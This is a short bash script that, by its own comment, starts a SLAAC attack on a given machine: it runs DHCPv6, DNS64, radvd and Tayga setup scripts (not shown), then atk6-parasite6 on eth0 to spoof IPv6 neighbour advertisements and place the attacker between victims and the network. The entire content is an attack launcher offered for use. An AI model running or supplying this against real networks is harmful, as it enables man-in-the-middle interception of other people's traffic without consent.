#!/bin/bash

# This script will run all the components needed to
# start a SLAAC attack with a given machine.

if [ -z "$1" ]
then
    echo "MUST SUPPLY eth0's IPv4 ADDRESS!!!"
    exit 1
fi

./DHCPv6.sh
./DNS64.sh
./Radvd.sh
./Tayga.sh $1
tail /var/log/syslog
atk6-parasite6 eth0
